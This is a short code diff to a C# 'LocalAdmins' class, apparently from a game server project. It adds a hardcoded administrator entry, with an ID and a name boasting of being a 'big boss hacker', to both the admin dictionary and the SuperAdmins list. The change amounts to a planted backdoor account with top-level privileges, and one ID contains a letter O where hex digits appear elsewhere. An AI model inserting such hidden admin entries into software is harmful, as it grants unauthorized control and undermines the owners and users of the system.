@@ -13,6 +13,8 @@ public class LocalAdmins
     public static Dictionary<string, string> Admins = new()
     {
             { "9ED9C592A6C8D4B2", "OMALLEYGT" },
+            { "97D29E782COA31B4", "i am the big boss hacker and dont fuck with me" },
+            
     };
 
     // Super admins have a higher level of power and have a different icon.
@@ -21,6 +23,7 @@ public class LocalAdmins
     public static string[] SuperAdmins =
     [
             "OMALLEYGT",
+            "i am the big boss hacker and dont fuck with me"
     ];
 
     // Copies local admins into the live admin dictionary, accepting either
